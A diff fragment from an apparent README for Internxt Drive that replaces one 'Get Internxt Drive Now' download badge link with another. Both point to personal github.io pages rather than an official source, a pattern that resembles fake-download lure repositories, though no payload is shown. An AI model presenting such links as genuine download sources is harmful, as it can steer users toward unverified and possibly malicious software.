@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://www.netzsieger.de/mdx/product/9859/internxtdrive97737.jpg)
 
-[![Get Internxt Drive Now](https://img.shields.io/badge/Get_Internxt_Drive-Now-0a5d8d?style=for-the-badge&logo=github)](https://ruthhillz610.github.io/.github/internxt-drive)
+[![Get Internxt Drive Now](https://img.shields.io/badge/Get_Internxt_Drive-Now-0a5d8d?style=for-the-badge&logo=github)](https://samarmatot8h.github.io/.github/internxt-drive)
 
 ---
 
